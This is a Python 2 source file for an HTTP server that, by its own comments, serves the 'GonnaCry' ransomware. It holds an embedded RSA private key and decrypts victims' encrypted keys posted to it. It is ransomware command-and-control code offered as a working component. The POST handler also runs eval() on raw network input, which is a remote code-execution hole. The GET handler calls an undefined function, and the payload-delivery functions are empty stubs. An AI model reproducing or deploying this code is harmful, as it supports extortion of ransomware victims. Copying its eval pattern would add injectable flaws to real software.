#!/usr/bin/env python
"""
Very simple HTTP server in python.
Usage::
    ./dummy-web-server.py [<port>]
Send a GET request::
    curl http://localhost
Send a HEAD request::
    curl -I http://localhost
Send a POST request::
    curl -d "foo=bar&bin=baz" http://localhost
"""
from BaseHTTPServer import BaseHTTPRequestHandler, HTTPServer
import SocketServer
import json
from sys import argv
import base64
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP

server_private_key = """-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAxF5BOX3N5UN1CsHpnfuU58lOw0+scQ39hOn6Q/QvM6aTOnYZ
ki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9RNZVegpnmGQCSRPlkfjN0TjfCFja
UX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr36BLaswJo1zbzhctK2SYX+Miov04
D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL04T1+tQXaGujLzc3QxJN3wo8rWkQ4
CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3AscXAQNI94ZPaqD6e2rWcSy2ZMiKVJg
CWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5vDQIDAQABAoIBAC3HA1GRwGQH+8sM
NZf8xFPcnB3v/vVEG6vWl98rl61k0cG5MnDfoR7i9hUW5NOfIy7/FqXKvr/6ezjw
lrMiJ3BavwZ6Ung2KEo89zG2XNS/e08I16xUCSvD+uj90zwdfx1kMkYk+G299H/C
B4DCoA074xj8g+qvhRZgVMle5B7F/gdun6AUGSxHC5uFmibM39MmMuSH16oJGcn5
0VRBmaB8vqMOFIyVKraoX4XAQwKE3by/VTM0kxBjmUZeUs2C1Paag7g09TuzQbXm
y3Tsv4aCZwrZlEXaFHopGz3HVHot2Ps3Qaq8WD76+SbzBm3pHayo3cDXvQwC1L7O
i/bihAkCgYEA23sqvBSVdMtWF+ktSXkt2OfVJsFpp3ym+qm2U5q9M+BTeyf4dnfP
/+Z5O5x6blFyf7ug8h2+8b0L6o34QfuaSXbJBtpmFS2GqG8B3KAYC4nnxonUxGuZ
ECc7wJRvo22A55rKVicmDWWr8rqNmbrNy9eoWUNYvNEouwr9nSW2Z9MCgYEA5QqW
rkUnmbIFd5gEKX+m9IKTUZ+dbuh1oHO3QqgmpeyZdxIvNa5C3bwuk6WBFGMjtCNl
NZeLGN8plcwlPxGEdCBTnhmKw0ikQWubYCx/NNNI2sWXidiym2bHI+2JkdOVx0HA
OU27+sbxyjqExCID+9b+c+t3MKZlzshif7L/YZ8CgYBLu8ZVO+0ObhN5ELbVwYC2
ddixFNA2QOcFW4ZUdvKOcfucZYBwsIsPTCHNFgORCX2u4bl5khYPKCJyfyaI7h6g
9uILAVV0PU9X02YbEQr7AEz/zxOh61bXohIWM6IKDIEMafcjn0KcINciXIj74N+e
VP38PybhkHKzh+lXTmoQjQKBgBKDHZSuUDoS8nAtIED+aU8f8qpJPV9GeKNkVu6T
SrRkgC7okFpFYHAtkpIqcVllffBEYBzJx9tVxjWuT2BemRcNudRweg+4olYLTX6j
ehCZ9yx/hfUFR8JZt0THITRhJpz5SoEXMFdflxFiU3LK0Qmc4eoaoQKUoGvrNFLf
89Y/AoGABgsbLx258EPtVqgY9uS9ta/XpUyKKjVGIqEY+jhn9lNhxQK+0iRQvD6C
eSopcx2e09eODLXAxOpi+f6K2mxJVMjxhvIthnad4vhtJjaBojaMG23+uOpX9Gj/
u7KSAN0pGuIw57saMWU1KFy2POKHI8+PP4rGeJhKx6isAt+3ZFk=
-----END RSA PRIVATE KEY-----"""


server_public_key = """-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAxF5BOX3N5UN1CsHpnfuU
58lOw0+scQ39hOn6Q/QvM6aTOnYZki57O6/JtgV2CetE+G5IZrRwYPAipFdChGM9
RNZVegpnmGQCSRPlkfjN0TjfCFjaUX80PgRVm0ZHaeCeoNjit0yeW3YZ5nBjPjNr
36BLaswJo1zbzhctK2SYX+Miov04D3iC83Vc8bbJ8Wiip4jpKPDFhyO1I3QkykL0
4T1+tQXaGujLzc3QxJN3wo8rWkQ4CaLAu1pb9QkdYhFG0D3TrljkRNiH0QnF3Asc
XAQNI94ZPaqD6e2rWcSy2ZMiKVJgCWA40p9qe34H8+9ub3TgC52oSyapwbxzqs5v
DQIDAQAB
-----END PUBLIC KEY-----"""




class S(BaseHTTPRequestHandler):


    def decrypt(self, enc):
        key = RSA.importKey(server_private_key)
        cipher = PKCS1_OAEP.new(key)

        decifrado = ""
        for i in enc:
            ciphertext = cipher.decrypt(i)
            decifrado += ciphertext
        return decifrado


    def logg(self):
        time = self.date_time_string() 
        ip = self.address_string()
        msg = "Connected By [{}] At [{}]".format(ip, time)
        #print(msg)

    def _set_headers(self):
        self.send_response(200)
        self.send_header('Content-type', 'text/html')
        self.end_headers()

    def do_GET(self):
        self._set_headers()
        pool_info = json.dumps(self.send_pool_info())
        self.wfile.write(pool_info)
        self.logg()
        
    def do_POST(self):
        # Gets the size of data
        content_length = int(self.headers['Content-Length']) 
        
        # Gets the encrypted data
        base64_encrypted = self.rfile.read(content_length) 
        object_encrypted = base64.b64decode(base64_encrypted)
        lista = eval(object_encrypted)
        
        # decrypt the data
        decrypted = self.decrypt(lista)

        # self.logg()
        # print("\nMSG [{}]".format(post_data))
        self._set_headers()

        # return the decrypted key
        self.wfile.write(decrypted)
        
        
def run(server_class=HTTPServer, handler_class=S, port=80):
    server_address = ('', port)
    httpd = server_class(server_address, handler_class)
    print ('Starting web server...')
    httpd.serve_forever()


# server send to victim the gonnacry
def get_gonnacry():
    pass 

# server send decryptor to victim
def get_decryptor():
    pass

    
if __name__ == "__main__":
    if len(argv) == 2:
        run(port=int(argv[1]))
    else:
        run()
